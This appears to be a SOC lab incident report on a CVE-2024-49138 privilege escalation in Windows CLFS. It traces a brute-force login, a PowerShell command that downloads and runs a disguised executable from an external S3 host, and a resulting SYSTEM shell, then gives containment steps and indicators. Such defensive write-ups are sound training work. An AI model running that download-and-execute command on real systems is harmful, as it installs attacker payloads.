# 	SOC335 - CVE-2024-49138 Exploitation Detected

## Executive Summary

On January 22, 2025, the Security Operations Center (SOC) detected a successful privilege escalation attack on the host **Victor** (172.16.17.207). The investigation revealed a multi-stage intrusion. The attacker first gained initial access via a brute-force attack, then used a PowerShell script to download and execute a malicious tool (`svohost.exe`). This tool exploited **CVE-2024-49138**, a critical vulnerability in the Windows Common Log File System (CLFS) driver, to elevate its privileges to **NT AUTHORITY\SYSTEM**. Endpoint logs confirm the entire attack chain was **Allowed** and successfully executed. The host is fully compromised at the highest privilege level. This is a **True Positive** critical incident.

## Incident Details

The initial alert was triggered by the execution of a malicious process associated with the CVE-2024-49138 exploit:

## Investigation and Analysis

### 1. Vulnerability Profile: CLFS Privilege Escalation (CVE-2024-49138)

**CVE-2024-49138** is a critical local privilege escalation (LPE) vulnerability in the Windows Common Log File System (CLFS) driver.
*   **How it Works:** It is a heap-based buffer overflow flaw. A local attacker who has already gained low-privileged access to a machine can run a specially crafted program (like the `svohost.exe` seen in this alert) that interacts with the CLFS driver. This interaction causes a memory corruption error, which the attacker can exploit to execute code with the permissions of the Windows Kernel.
*   **Impact:** A successful exploit allows the attacker to escalate their privileges from a standard user to **NT AUTHORITY\SYSTEM**, the highest level of access on a Windows machine. With SYSTEM privileges, the attacker has complete control and can disable security software, dump credentials, install persistent backdoors, and move laterally across the network.

### 2. Reconstructing the Multi-Stage Attack Chain

The investigation pieced together a clear, two-part attack chain.

**Stage 1: Initial Access via Brute-Force**
Before the exploit was run, log analysis revealed a successful brute-force attack against the host from the IP `185.107.56.141`. This was the initial vector that gave the attacker their low-privileged foothold.

**Stage 2: Payload Delivery and Execution**
After gaining access, the attacker used PowerShell to download and deploy the exploit.
*   **Download Command:**
    ```powershell
    $url = 'https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip'; $dest = 'C:\temp\service-installer.zip'; ... Invoke-WebRequest -Uri $url -OutFile $dest; ... Start-Process -FilePath "$extractPath\service_installer\svohost.exe"
    ```
*   **Explanation:** This command downloads a password-protected ZIP file, extracts its contents (including `svohost.exe`) to `C:\temp`, and then executes the malicious program.

**Stage 3: Privilege Escalation**
The execution of `svohost.exe` triggered the CVE-2024-49138 exploit.
*   **Process Chain:** The EDR logs show the clear parent-child relationship: `powershell.exe` -> `svohost.exe` -> `conhost.exe`. This is a highly anomalous chain. `svohost.exe` is a malicious executable typosquatting the legitimate `svchost.exe`, and its execution from a temp directory by PowerShell is a major red flag.

*   **Confirmation:** The `Device Action: Allowed` confirms the entire chain executed without being blocked. Threat intelligence from VirusTotal (50 detections) and the PDB path within the file (`C:\...CVE-2024-49138-POC.pdb`) definitively link this executable to the exploit.

**Stage 4: Post-Escalation Activity**
After successfully gaining SYSTEM privileges, the attacker ran `whoami.exe`. This is a common first step for an attacker to verify that their privilege escalation was successful and to confirm they are now running as a high-privileged user.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Firewall Logs, VirusTotal, Hybrid Analysis
*   **Skills Demonstrated:** LPE Analysis (CVE-2024-49138), Log Correlation, Attack Chain Reconstruction, LOLBin Technique Recognition, PowerShell Analysis.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** The activity includes a brute-force attack and the download/execution of a known exploit.
*   **What Is The Attack Type?** **Privilege Escalation.**
*   **Was the Attack Successful?** **Yes.** The exploit was executed, and the attacker gained SYSTEM privileges.
*   **Do You Need Tier 2 Escalation?** **Yes.** A full system compromise at the SYSTEM level is a critical incident.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC335 was a **true positive** for a successful and critical privilege escalation attack. An attacker first gained access via a brute-force, then deployed a known exploit for CVE-2024-49138 to gain full SYSTEM-level control of the host **Victor**. The host is fully compromised and poses a severe risk to the network.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the host **Victor** (172.16.17.207) from the network to prevent the attacker from using their SYSTEM privileges for lateral movement or data exfiltration.
2.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team for a full forensic investigation.
3.  **INVESTIGATION:** The IR team must assume the attacker has had SYSTEM access since the time of the alert. They need to hunt for persistence mechanisms, credential dumping (e.g., Mimikatz), and any signs of lateral movement.
4.  **PATCHING:** The highest priority is to apply the security patches released by Microsoft for CVE-2024-49138 to this and all other vulnerable Windows systems.
5.  **RECOVERY:** The compromised host cannot be trusted and must be wiped and re-imaged from a known-good source.
6.  **BLOCK INDICATORS:**
    *   **IPs:** Block the brute-force IP `185.107.56.141` and the download host `files-ld.s3.us-east-2.amazonaws.com` (if not required for business).
    *   **Hash:** Add the SHA256 hash `b432dcf4...2db9` to the EDR blocklist.
7.  **ACCESS CONTROL:** Review and harden remote access controls (like RDP) to prevent brute-force attacks. Implement MFA, strong passwords, and account lockout policies.
